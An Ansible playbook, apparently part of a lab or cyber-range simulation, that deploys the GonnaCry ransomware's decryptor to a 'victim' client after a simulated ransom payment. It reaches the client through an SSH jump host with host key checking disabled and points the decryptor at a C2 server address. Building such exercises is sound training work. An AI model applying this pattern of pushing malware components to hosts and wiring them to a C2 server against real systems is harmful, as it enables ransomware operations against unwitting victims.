---
# Deploy GonnaCry decryptor to victim after "payment confirmed".
# Simulates attacker releasing decryptor tool post-ransom.
#
# Prerequisites:
#   - deploy_gonnacry.yml must have run (python3-pip and pycryptodome already installed)
#   - main.py must have run on the client (~/gonnacry/ key files must exist)
#
# Edit target_ips to match the victim client(s).

- name: Stage decryptor on victim clients
  hosts: localhost
  gather_facts: false

  vars:
    target_ips:
      - 10.10.20.157     # client2

  tasks:
    - name: Add target clients to dynamic inventory
      add_host:
        name: "{{ item }}"
        groups: decryptor_targets
        ansible_user: "{{ client_user }}"
        ansible_password: "{{ client_password }}"
        ansible_ssh_common_args: >-
          -o ProxyCommand="ssh -i {{ infra_ssh_private_key_path }}
          -o StrictHostKeyChecking=no
          -o UserKnownHostsFile=/dev/null
          -W %h:%p {{ infra_admin_user }}@{{ (vms | selectattr('name', 'equalto', 'gateway1') | first).wan_ip }}"
      loop: "{{ target_ips }}"

- name: Deploy decryptor to victim
  hosts: decryptor_targets
  become: true
  gather_facts: false

  tasks:
    - name: Copy decryptor and its dependencies
      copy:
        src: "{{ project_root }}/GonnaCry/src/GonnaCry/{{ item }}"
        dest: /home/{{ client_user }}/attacks/gonnacry/{{ item }}
        owner: "{{ client_user }}"
        mode: '0644'
      loop:
        - decryptor.py
        - symmetric.py
        - environment.py
        - utils.py
        - variables.py

    - name: Set C2 server address in decryptor
      lineinfile:
        path: /home/{{ client_user }}/attacks/gonnacry/decryptor.py
        regexp: '^server_address\s*='
        line: 'server_address = "http://{{ c2server_ip }}:{{ gonnacry_server_port }}"'
